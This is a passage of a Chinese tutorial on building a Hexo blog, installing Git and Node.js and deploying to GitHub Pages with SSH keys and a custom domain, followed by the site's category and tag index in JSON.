是目前比较流行的分布式版本控制系统，我们使用它与github进行交互下载对应版本的的git安装就好，下载地址 git_download，装后打开Git Bash 1git --version #可以查看版本号 2. 安装Node.js Node.js是一个Javascript运行环境，是一个让 JavaScript 运行在服务端的开发平台，我们用来快速生成博客的静态页面，LTS版本为长期支持版，CURRENT版本为最新版，任选一个正常安装即可下载地址Node.js_download。 二、开始本地搭建博客1. 新建本地文件夹 在本地新建一个文件夹用来储存我们的博客，Git Bash进入文件夹下，执行命令：npm install hexo -g 用来安装hexo 2. 搭建本地服务 依次在本地文件夹根目录下执行以下命令初始化并生成服务。 1hexo init # 初始化 1npm isntall # 安装npm依赖包 1hexo generate # 生成静态网页 全部执行成功后浏览器访问http://localhost:4000,如果出现默认的hexo博客，那么我们本地搭建博客就完成了 1hexo server # 生成本地服务 三、本地博客发布到网络上1.创建Github远程仓库 这里我们就要用到github了。有账户的可以略过，没有账户的新建账户，并登录。新建一个仓库，仓库名格式设置为：xxxx.github.io,其他可以不动。 之后我们就可以到如下界面，记录ssh的地址 在更改本地目录下的_config.yml配置文件，最后加上. 1234deploy: type: git repo: 这里填刚记录的ssh地址 branch: master 2. 将Hexo与 Github连接 按照如下格式输入，在本地创建git用户名和邮箱进行并生成ssh密钥123git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;ssh-keygen -t rsa -C &quot;youremail&quot; 接下来我们把生成的id_rsa.pub文件用文本编辑器打开，复制里面的内容绑定到GitHub上，标题随意。 点击新建ssh keys，title随便填，key填写id_rsa.pub的内容即可，应该会要求输入密码测试是否成功 1ssh -T git@github.com #注意这里的地址不用改 提示Are you sure you want to continue connecting (yes/no)?时输入yes 当看到Hi Budtit! You’ve successfully authenticated, but GitHub does not provide shell access.时说明配置成功 3. 部署到github1hexo d 如果报错说not found git 我们执行以下命令：npm install hexo-deployer-git --save安装插件，然后在执行上一步命令第一次部署应该会让登录，浏览yourname.github.io成功显示博客页 上面在配置branch时候我写的Master，可以自己新建分支，专门用于存放blog四、写作并上传第一篇博客1. 写作1hexo new [layout] &lt;title&gt; #创建新文章 创建后会在本地目录生成测试.md文件，用markdown语法编辑文件后保存，建议每次写作后本地部署完成进入http://localhost:4000 查看无误后再上传。hexo server # 本地服务部署 可简写为hexo s 2. 上传依次执行命令，hexo的具体用法请查看官方文档 戳这里 123hexo clean # 清除缓存hexo generate # 生成静态页面 可简写为hexo ghexo deploy # 部署博客 可简写为hexo d 五、解析私人域名 这里就要买域名了，添加两条记录 然后在本地博客目录下的source文件夹下新建名为CNAME的文件，其中写入域名 最后在github库中的setting中的Custom domain下填写购买的域名,save保存。好了，域名配置完成。","categories":[{"name":"Hexo","slug":"Hexo","permalink":"http://www.zzugo.ayxyj.cn/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://www.zzugo.ayxyj.cn/tags/Hexo/"},{"name":"博客","slug":"博客","permalink":"http://www.zzugo.ayxyj.cn/tags/%E5%8D%9A%E5%AE%A2/"}]}],"categories":[{"name":"Personal","slug":"Personal","permalink":"http://www.zzugo.ayxyj.cn/categories/Personal/"},{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/"},{"name":"Geth","slug":"BlockChain/Geth","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/Geth/"},{"name":"MetaMask","slug":"BlockChain/Geth/MetaMask","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/Geth/MetaMask/"},{"name":"EVM","slug":"BlockChain/EVM","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/EVM/"},{"name":"WannaCry","slug":"WannaCry","permalink":"http://www.zzugo.ayxyj.cn/categories/WannaCry/"},{"name":"Hyperledger Fabric","slug":"BlockChain/Hyperledger-Fabric","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/Hyperledger-Fabric/"},{"name":"Docker","slug":"Docker","permalink":"http://www.zzugo.ayxyj.cn/categories/Docker/"},{"name":"Registry","slug":"Docker/Registry","permalink":"http://www.zzugo.ayxyj.cn/categories/Docker/Registry/"},{"name":"Portainer","slug":"Docker/Portainer","permalink":"http://www.zzugo.ayxyj.cn/categories/Docker/Portainer/"},{"name":"Solidity","slug":"BlockChain/Solidity","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/Solidity/"},{"name":"IPFS","slug":"BlockChain/IPFS","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/IPFS/"},{"name":"Hexo","slug":"Hexo","permalink":"http://www.zzugo.ayxyj.cn/categories/Hexo/"},{"name":"Git","slug":"Git","permalink":"http://www.zzugo.ayxyj.cn/categories/Git/"},{"name":"Sublime","slug":"Sublime","permalink":"http://www.zzugo.ayxyj.cn/categories/Sublime/"},{"name":"FISCO BCOS","slug":"FISCO-BCOS","permalink":"http://www.zzugo.ayxyj.cn/categories/FISCO-BCOS/"},{"name":"Markdown","slug":"Markdown","permalink":"http://www.zzugo.ayxyj.cn/categories/Markdown/"}],"tags":[{"name":"Personal","slug":"Personal","permalink":"http://www.zzugo.ayxyj.cn/tags/Personal/"},{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/tags/BlockChain/"},{"name":"Geth","slug":"Geth","permalink":"http://www.zzugo.ayxyj.cn/tags/Geth/"},{"name":"MetaMask","slug":"MetaMask","permalink":"http://www.zzugo.ayxyj.cn/tags/MetaMask/"},{"name":"EVM","slug":"EVM","permalink":"http://www.zzugo.ayxyj.cn/tags/EVM/"},{"name":"WannaCry","slug":"WannaCry","permalink":"http://www.zzugo.ayxyj.cn/tags/WannaCry/"},{"name":"Hyperledger Fabric","slug":"Hyperledger-Fabric","permalink":"http://www.zzugo.ayxyj.cn/tags/Hyperledger-Fabric/"},{"name":"Docker","slug":"Docker","permalink":"http://www.zzugo.ayxyj.cn/tags/Docker/"},{"name":"Registry","slug":"Registry","permalink":"http://www.zzugo.ayxyj.cn/tags/Registry/"},{"name":"Portainer","slug":"Portainer","permalink":"http://www.zzugo.ayxyj.cn/tags/Portainer/"},{"name":"Solidity","slug":"Solidity","permalink":"http://www.zzugo.ayxyj.cn/tags/Solidity/"},{"name":"IPFS","slug":"IPFS","permalink":"http://www.zzugo.ayxyj.cn/tags/IPFS/"},{"name":"Hexo","slug":"Hexo","permalink":"http://www.zzugo.ayxyj.cn/tags/Hexo/"},{"name":"Git","slug":"Git","permalink":"http://www.zzugo.ayxyj.cn/tags/Git/"},{"name":"Sublime","slug":"Sublime","permalink":"http://www.zzugo.ayxyj.cn/tags/Sublime/"},{"name":"FISCO BCOS","slug":"FISCO-BCOS","permalink":"http://www.zzugo.ayxyj.cn/tags/FISCO-BCOS/"},{"name":"hexo","slug":"hexo","permalink":"http://www.zzugo.ayxyj.cn/tags/hexo/"},{"name":"博客","slug":"博客","permalink":"http://www.zzugo.ayxyj.cn/tags/%E5%8D%9A%E5%AE%A2/"}]}